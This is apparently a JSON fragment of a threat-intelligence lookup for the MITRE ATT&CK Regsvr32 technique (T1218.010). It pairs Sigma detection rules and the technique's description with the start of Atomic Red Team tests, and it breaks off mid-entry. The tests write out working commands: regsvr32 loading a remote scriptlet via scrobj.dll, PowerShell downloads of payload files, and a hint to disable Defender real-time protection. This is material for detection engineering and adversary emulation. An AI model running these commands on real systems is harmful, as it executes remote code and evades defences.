+                            "raw": "author: elhoim\ndate: 2022/05/05\ndescription: Detects \"regsvr32.exe\" spawning \"explorer.exe\", which is very uncommon.\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\explorer.exe\n    ParentImage|endswith: \\regsvr32.exe\nfalsepositives:\n- Unknown\nid: 6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/28\nreferences:\n- https://redcanary.com/blog/intelligence-insights-april-2022/\n- https://www.echotrail.io/insights/search/regsvr32.exe\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.010\ntitle: Regsvr32 Spawning Explorer\n",
+                            "sigma:id": "6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca",
+                            "title": "Regsvr32 Spawning Explorer",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b97f1d35-4249-4486-a6b5-ee60ccf24fab",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1218.010",
+                            "mitre-cti:description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",
+                            "mitre-cti:name": "Regsvr32",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Casey Smith'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab', 'type': 'attack-pattern', 'created': '2020-01-23T19:52:17.414Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1218.010', 'url': 'https://attack.mitre.org/techniques/T1218/010'}, {'source_name': 'Microsoft Regsvr32', 'description': 'Microsoft. (2015, August 14). How to use the Regsvr32 tool and troubleshoot Regsvr32 error messages. Retrieved June 22, 2016.', 'url': 'https://support.microsoft.com/en-us/kb/249873'}, {'source_name': 'LOLBAS Regsvr32', 'url': 'https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/', 'description': 'LOLBAS. (n.d.). Regsvr32.exe. Retrieved July 31, 2019.'}, {'source_name': 'Carbon Black Squiblydoo Apr 2016', 'description': 'Nolen, R. et al.. (2016, April 28). Threat Advisory: “Squiblydoo” Continues Trend of Attackers Using Native OS Tools to “Live off the Land”. Retrieved April 9, 2018.', 'url': 'https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/'}, {'source_name': 'FireEye Regsvr32 Targeting Mongolian Gov', 'description': 'Anubhav, A., Kizhakkinan, D. (2017, February 22). Spear Phishing Techniques Used in Attacks Targeting the Mongolian Government. Retrieved February 24, 2017.', 'url': 'https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html'}], 'modified': '2022-03-11T20:41:41.503Z', 'name': 'Regsvr32', 'description': 'Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\\n\\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\\n\\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_detection': 'Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '2.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Network Traffic: Network Connection Creation', 'Command: Command Execution', 'Process: Process Creation', 'Module: Module Load'], 'x_mitre_defense_bypassed': ['Digital Certificate Validation', 'Anti-virus', 'Application control'], 'x_mitre_permissions_required': ['Administrator', 'User']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e1693bc8-7168-4eab-8718-cdcaa68a1738",
+                        "lookup_data": {
+                            "description": "Office application called wmic to proxye execution through a LOLBIN process. This is often used to break suspicious parent-child chain (Office app spawns LOLBin).",
+                            "raw": "author: Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)\ndate: 2021/08/23\ndescription: Office application called wmic to proxye execution through a LOLBIN process.\n  This is often used to break suspicious parent-child chain (Office app spawns LOLBin).\ndetection:\n  condition: all of selection_*\n  selection_parent:\n    CommandLine|contains:\n    - regsvr32\n    - rundll32\n    - msiexec\n    - mshta\n    - verclsid\n    CommandLine|contains|all:\n    - process\n    - create\n    - call\n    ParentImage|endswith:\n    - \\winword.exe\n    - \\excel.exe\n    - \\powerpnt.exe\n  selection_wmic:\n  - Image|endswith: \\wbem\\WMIC.exe\n  - OriginalFileName: wmic.exe\nfalsepositives:\n- Unknown\nid: e1693bc8-7168-4eab-8718-cdcaa68a1738\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n- https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml\nrelated:\n- id: 518643ba-7d9c-4fa5-9f37-baed36059f6a\n  type: derived\n- id: 9d1c72f5-43f0-4da5-9320-648cf2099dd0\n  type: obsoletes\n- id: c0e1c3d5-4381-4f18-8145-2583f06a1fe5\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.t1204.002\n- attack.t1047\n- attack.t1218.010\n- attack.execution\n- attack.defense_evasion\ntitle: Suspicious WMI Execution Via Office Process\n",
+                            "sigma:id": "e1693bc8-7168-4eab-8718-cdcaa68a1738",
+                            "title": "Suspicious WMI Execution Via Office Process",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "bd70d3f8-e60e-4d25-89f0-0b5a9cff20e0",
+                        "lookup_data": {
+                            "description": "Detects a suspicious DLL loading from AppData Local path as described in BlueMashroom report",
+                            "raw": "author: Florian Roth (Nextron Systems), Tim Shelton\ndate: 2019/10/02\ndescription: Detects a suspicious DLL loading from AppData Local path as described\n  in BlueMashroom report\ndetection:\n  condition: selection and not 1 of filter*\n  filter_teams:\n  - CommandLine|contains: AppData\\Local\\Microsoft\\TeamsMeetingAddin\\\n  - CommandLine|endswith:\n    - \\x86\\Microsoft.Teams.AddinLoader.dll\n    - \\x86\\Microsoft.Teams.AddinLoader.dll\"\n    - \\x64\\Microsoft.Teams.AddinLoader.dll\n    - \\x64\\Microsoft.Teams.AddinLoader.dll\"\n  filter_webex:\n    CommandLine|endswith: \\AppData\\Local\\WebEx\\WebEx64\\Meetings\\atucfobj.dll\n  selection:\n  - CommandLine|contains|all:\n    - \\regsvr32\n    - \\AppData\\Local\\\n  - CommandLine|contains|all:\n    - \\AppData\\Local\\\n    - ',DllEntry'\nfalsepositives:\n- Unlikely\nid: bd70d3f8-e60e-4d25-89f0-0b5a9cff20e0\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/05\nreferences:\n- https://www.virusbulletin.com/conference/vb2019/abstracts/apt-cases-exploiting-vulnerabilities-region-specific-software\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.010\ntitle: BlueMashroom DLL Load\n",
+                            "sigma:id": "bd70d3f8-e60e-4d25-89f0-0b5a9cff20e0",
+                            "title": "BlueMashroom DLL Load",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
+                        "lookup_data": {
+                            "description": "Detects various anomalies in relation to regsvr32.exe",
+                            "raw": "author: Florian Roth (Nextron Systems), oscd.community, Tim Shelton\ndate: 2019/01/16\ndescription: Detects various anomalies in relation to regsvr32.exe\ndetection:\n  condition: 1 of selection* and not 1 of filter*\n  filter1:\n    CommandLine|contains:\n    - \\AppData\\Local\\Microsoft\\Teams\n    - \\AppData\\Local\\WebEx\\WebEx64\\Meetings\\atucfobj.dll\n  filter2:\n    CommandLine|contains: \\Program Files\\Box\\Box\\Temp\\\n    ParentImage: C:\\Program Files\\Box\\Box\\FS\\streem.exe\n  filter_legitimate:\n    CommandLine|endswith: /s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll\n  selection1:\n    CommandLine|contains: \\Temp\\\n    Image|endswith: \\regsvr32.exe\n  selection2:\n    Image|endswith: \\regsvr32.exe\n    ParentImage|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\powershell_ise.exe\n  selection3:\n    Image|endswith: \\regsvr32.exe\n    ParentImage|endswith: \\cmd.exe\n  selection4a:\n    CommandLine|contains|all:\n    - '/i:'\n    - http\n    CommandLine|endswith: scrobj.dll\n    Image|endswith: \\regsvr32.exe\n  selection4b:\n    CommandLine|contains|all:\n    - '/i:'\n    - ftp\n    CommandLine|endswith: scrobj.dll\n    Image|endswith: \\regsvr32.exe\n  selection5:\n    Image|endswith: \\wscript.exe\n    ParentImage|endswith: \\regsvr32.exe\n  selection6:\n    CommandLine|contains: '..\\..\\..\\Windows\\System32\\regsvr32.exe '\n    Image|endswith: \\EXCEL.EXE\n  selection7:\n    Image|endswith: \\regsvr32.exe\n    ParentImage|endswith: \\mshta.exe\n  selection8:\n    CommandLine|contains:\n    - \\AppData\\Local\n    - C:\\Users\\Public\n    Image|endswith: \\regsvr32.exe\n  selection9:\n    CommandLine|endswith:\n    - .jpg\n    - .jpeg\n    - .png\n    - .gif\n    - .bin\n    - .tmp\n    - .temp\n    - .txt\n    Image|endswith: \\regsvr32.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/21\nreferences:\n- https://subt0x10.blogspot.de/2017/04/bypass-application-whitelisting-script.html\n- https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.010\n- car.2019-04-002\n- car.2019-04-003\ntitle: Regsvr32 Anomaly\n",
+                            "sigma:id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
+                            "title": "Regsvr32 Anomaly",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
+                        "lookup_data": {
+                            "description": "Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)",
+                            "raw": "author: Maxim Pavlunin\ndate: 2020/04/01\ndescription: Detects a suspicious child process of a Microsoft HTML Help system when\n  executing compiled HTML files (.chm)\ndetection:\n  condition: 1 of selection_*\n  selection_1:\n    Image|endswith:\n    - \\cmd.exe\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\regsvr32.exe\n    - \\wmic.exe\n    - \\rundll32.exe\n    - \\MSHTA.EXE\n    - \\CertUtil.exe\n    - \\CertReq.exe\n    - \\MSbuild.exe\n    - \\installutil.exe\n    - \\schtasks.exe\n    - \\msiexec.exe\n    ParentImage:\n    - C:\\Windows\\hh.exe\n    - C:\\Windows\\SysWOW64\\hh.exe\n  selection_2:\n    CommandLine|contains:\n    - .application\n    - \\Downloads\\\n    - \\Content.Outlook\\\n    - \\AppData\\Local\\Temp\\\n    Image|endswith:\n    - \\Windows\\hh.exe\n    - \\Windows\\SysWOW64\\hh.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 52cad028-0ff0-4854-8f67-d25dfcbc78b4\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/24\nreferences:\n- https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/\n- https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-27939090904026cc396b0b629c8e4314acd6f5dac40a676edbc87f4567b47eb7\n- https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.001\n- attack.t1218.010\n- attack.t1218.011\n- attack.execution\n- attack.t1059.001\n- attack.t1059.003\n- attack.t1059.005\n- attack.t1059.007\n- attack.t1047\n- attack.t1566\n- attack.t1566.001\n- attack.initial_access\n- attack.t1218\ntitle: HTML Help Shell Spawn\n",
+                            "sigma:id": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
+                            "title": "HTML Help Shell Spawn",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "2dd2c217-bf68-437a-b57c-fe9fd01d5de8",
+                        "lookup_data": {
+                            "description": "Detects a certain command line flag combination used by regsvr32 when used to download and register a DLL from a remote address which uses HTTP (not HTTPS) and a IP address and not FQDN",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/01/11\ndescription: Detects a certain command line flag combination used by regsvr32 when\n  used to download and register a DLL from a remote address which uses HTTP (not HTTPS)\n  and a IP address and not FQDN\ndetection:\n  condition: all of selection_*\n  selection_flags:\n    CommandLine|contains|all:\n    - ' /s'\n    - ' /u'\n  selection_ip:\n    CommandLine|contains:\n    - ' /i:http://1'\n    - ' /i:http://2'\n    - ' /i:http://3'\n    - ' /i:http://4'\n    - ' /i:http://5'\n    - ' /i:http://6'\n    - ' /i:http://7'\n    - ' /i:http://8'\n    - ' /i:http://9'\n    - ' /i:https://1'\n    - ' /i:https://2'\n    - ' /i:https://3'\n    - ' /i:https://4'\n    - ' /i:https://5'\n    - ' /i:https://6'\n    - ' /i:https://7'\n    - ' /i:https://8'\n    - ' /i:https://9'\nfalsepositives:\n- FQDNs that start with a number\nid: 2dd2c217-bf68-437a-b57c-fe9fd01d5de8\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/11\nreferences:\n- https://twitter.com/mrd0x/status/1461041276514623491c19-ps\n- https://twitter.com/tccontre18/status/1480950986650832903\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.010\ntitle: Suspicious Regsvr32 HTTP IP Pattern\n",
+                            "sigma:id": "2dd2c217-bf68-437a-b57c-fe9fd01d5de8",
+                            "title": "Suspicious Regsvr32 HTTP IP Pattern",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "8a582fe2-0882-4b89-a82a-da6b2dc32937",
+                        "lookup_data": {
+                            "description": "Detects suspicious and uncommon child processes of WmiPrvSE",
+                            "raw": "author: Vadim Khrykov (ThreatIntel), Cyb3rEng\ndate: 2021/08/23\ndescription: Detects suspicious and uncommon child processes of WmiPrvSE\ndetection:\n  condition: selection_parent and 1 of selection_children_*\n  selection_children_1:\n    Image|endswith:\n    - \\regsvr32.exe\n    - \\rundll32.exe\n    - \\msiexec.exe\n    - \\mshta.exe\n    - \\verclsid.exe\n  selection_children_2:\n    CommandLine|contains:\n    - powershell\n    - pwsh\n    - mshta\n    - rundll32\n    - regsvr32\n    - wscript\n    - cscript\n    Image|endswith: \\cmd.exe\n  selection_parent:\n    ParentImage|endswith: \\wbem\\WmiPrvSE.exe\nfalsepositives:\n- Unknown\nid: 8a582fe2-0882-4b89-a82a-da6b2dc32937\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n- https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml\n- https://blog.osarmor.com/319/onenote-attachment-delivers-asyncrat-malware/\nrelated:\n- id: 692f0bec-83ba-4d04-af7e-e884a96059b6\n  type: similar\n- id: d21374ff-f574-44a7-9998-4a8c8bf33d7d\n  type: similar\nstatus: test\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1047\n- attack.t1204.002\n- attack.t1218.010\ntitle: Suspicious WmiPrvse Child Process Spawned\n",
+                            "sigma:id": "8a582fe2-0882-4b89-a82a-da6b2dc32937",
+                            "title": "Suspicious WmiPrvse Child Process Spawned",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "089fc3d2-71e8-4763-a8a5-c97fbb0a403e",
+                        "lookup_data": {
+                            "description": "Detects execution of REGSVR32.exe with DLL masquerading as image files",
+                            "raw": "author: frack113\ndate: 2021/11/29\ndescription: Detects execution of REGSVR32.exe with DLL masquerading as image files\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|endswith:\n    - .jpg\n    - .jpeg\n    - .gif\n    - .png\n    - .ico\n    - .bmp\n    - .tif\n    - .tiff\n    - .eps\n    - .raw\n    - .cr2\n    - .nef\n    - .orf\n    - .sr2\n  selection_img:\n  - Image|endswith: \\regsvr32.exe\n  - OriginalFileName: \\REGSVR32.EXE\nfalsepositives:\n- Unknown\nid: 089fc3d2-71e8-4763-a8a5-c97fbb0a403e\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/31\nreferences:\n- https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/\n- https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html\n- https://guides.lib.umich.edu/c.php?g=282942&p=1885348\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.010\ntitle: Suspicious Regsvr32 Execution With Image Extension\n",
+                            "sigma:id": "089fc3d2-71e8-4763-a8a5-c97fbb0a403e",
+                            "title": "Suspicious Regsvr32 Execution With Image Extension",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "46123129-1024-423e-9fae-43af4a0fa9a5",
+                        "lookup_data": {
+                            "description": "Detect the use of Windows Defender to download payloads",
+                            "raw": "author: Matthew Matchen\ndate: 2020/09/04\ndescription: Detect the use of Windows Defender to download payloads\ndetection:\n  condition: all of selection*\n  selection1:\n  - CommandLine|contains: MpCmdRun.exe\n  - Description: Microsoft Malware Protection Command Line Utility\n  selection2:\n    CommandLine|contains|all:\n    - DownloadFile\n    - url\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\nid: 46123129-1024-423e-9fae-43af4a0fa9a5\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://web.archive.org/web/20200903194959/https://twitter.com/djmtshepana/status/1301608169496612866\n- https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.command_and_control\n- attack.t1105\ntitle: Windows Defender Download Activity\n",
+                            "sigma:id": "46123129-1024-423e-9fae-43af4a0fa9a5",
+                            "title": "Windows Defender Download Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c7e91a02-d771-4a6d-a700-42587e0b1095",
+                        "lookup_data": {
+                            "description": "Detects network connections and DNS queries initiated by Regsvr32.exe",
+                            "raw": "author: Dmitriy Lifanov, oscd.community\ndate: 2019/10/25\ndescription: Detects network connections and DNS queries initiated by Regsvr32.exe\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\regsvr32.exe\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- Image\n- DestinationIp\n- DestinationPort\nid: c7e91a02-d771-4a6d-a700-42587e0b1095\nlevel: high\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/\n- https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/\nstatus: test\ntags:\n- attack.execution\n- attack.t1559.001\n- attack.defense_evasion\n- attack.t1218.010\ntitle: Regsvr32 Network Activity\n",
+                            "sigma:id": "c7e91a02-d771-4a6d-a700-42587e0b1095",
+                            "title": "Regsvr32 Network Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "36e037c4-c228-4866-b6a3-48eb292b9955",
+                        "lookup_data": {
+                            "description": "Detects network connections and DNS queries initiated by Regsvr32.exe",
+                            "raw": "author: Dmitriy Lifanov, oscd.community\ndate: 2019/10/25\ndescription: Detects network connections and DNS queries initiated by Regsvr32.exe\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\regsvr32.exe\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- Image\n- DestinationIp\n- DestinationPort\nid: 36e037c4-c228-4866-b6a3-48eb292b9955\nlevel: high\nlogsource:\n  category: dns_query\n  product: windows\nmodified: 2022/11/28\nreferences:\n- https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/\n- https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/\nrelated:\n- id: c7e91a02-d771-4a6d-a700-42587e0b1095\n  type: derived\nstatus: test\ntags:\n- attack.execution\n- attack.t1559.001\n- attack.defense_evasion\n- attack.t1218.010\ntitle: Regsvr32 Network Activity - DNS\n",
+                            "sigma:id": "36e037c4-c228-4866-b6a3-48eb292b9955",
+                            "title": "Regsvr32 Network Activity - DNS",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "04f5363a-6bca-42ff-be70-0d28bf629ead",
+                        "lookup_data": {
+                            "description": "Initial execution of malicious document calls wmic to execute the file with regsvr32",
+                            "raw": "author: Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)\ndate: 2021/08/23\ndescription: Initial execution of malicious document calls wmic to execute the file\n  with regsvr32\ndetection:\n  condition: all of selection*\n  selection1:\n  - Image|endswith: \\wbem\\WMIC.exe\n  - CommandLine|contains: 'wmic '\n  selection2:\n    ParentImage|endswith:\n    - \\winword.exe\n    - \\excel.exe\n    - \\powerpnt.exe\n    - \\msaccess.exe\n    - \\mspub.exe\n    - \\eqnedt32.exe\n    - \\visio.exe\nfalsepositives:\n- Unknown\nid: 04f5363a-6bca-42ff-be70-0d28bf629ead\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n- https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml\nstatus: experimental\ntags:\n- attack.t1204.002\n- attack.t1047\n- attack.t1218.010\n- attack.execution\n- attack.defense_evasion\ntitle: Office Applications Spawning Wmi Cli Alternate\n",
+                            "sigma:id": "04f5363a-6bca-42ff-be70-0d28bf629ead",
+                            "title": "Office Applications Spawning Wmi Cli Alternate",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1218.010",
+                "display_name": "Signed Binary Proxy Execution: Regsvr32",
+                "atomic_tests": [
+                    {
+                        "name": "Regsvr32 local COM scriptlet execution",
+                        "auto_generated_guid": "449aa403-6aba-47ce-8a37-247d21ef0306",
+                        "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "filename": {
+                                "description": "Name of the local file, include path.",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct"
+                            },
+                            "regsvr32path": {
+                                "description": "Default location of Regsvr32.exe",
+                                "type": "path",
+                                "default": "C:\\Windows\\system32"
+                            },
+                            "regsvr32name": {
+                                "description": "Default name of Regsvr32.exe",
+                                "type": "string",
+                                "default": "regsvr32.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Regsvr32.sct must exist on disk at specified location (#{filename})\n",
+                                "prereq_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct\" -OutFile \"#{filename}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "#{regsvr32path}\\#{regsvr32name} /s /u /i:\"#{filename}\" scrobj.dll\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Regsvr32 remote COM scriptlet execution",
+                        "auto_generated_guid": "c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36",
+                        "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable\nwindows defender real-time protection to fix it. Upon execution, calc.exe will be launched.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "url": {
+                                "description": "URL to hosted sct file",
+                                "type": "url",
+                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct"
+                            },
+                            "regsvr32path": {
+                                "description": "Default location of Regsvr32.exe",
+                                "type": "path",
+                                "default": "C:\\Windows\\system32"
+                            },
+                            "regsvr32name": {
+                                "description": "Default name of Regsvr32.exe",
+                                "type": "string",
+                                "default": "regsvr32.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "#{regsvr32path}\\#{regsvr32name} /s /u /i:#{url} scrobj.dll\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Regsvr32 local DLL execution",
+                        "auto_generated_guid": "08ffca73-9a3d-471a-aeb0-68b4aa3ab37b",
+                        "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "dll_name": {
+                                "description": "Name of DLL to Execute, DLL Should export DllRegisterServer",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll"
+                            },
+                            "regsvr32path": {
+                                "description": "Default location of Regsvr32.exe",
+                                "type": "path",
+                                "default": "C:\\Windows\\system32"
+                            },
+                            "regsvr32name": {
+                                "description": "Default name of Regsvr32.exe",
+                                "type": "string",
+                                "default": "regsvr32.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})\n",
+                                "prereq_command": "if (Test-Path \"#{dll_name}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll\" -OutFile \"#{dll_name}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\\#{regsvr32name} /s #{dll_name} )\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Regsvr32 Registering Non DLL",
+                        "auto_generated_guid": "1ae5ea1f-0a4e-4e54-b2f5-4ac328a7f421",
+                        "description": "Replicating observed Gozi maldoc behavior registering a dll with an altered extension\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "dll_file": {
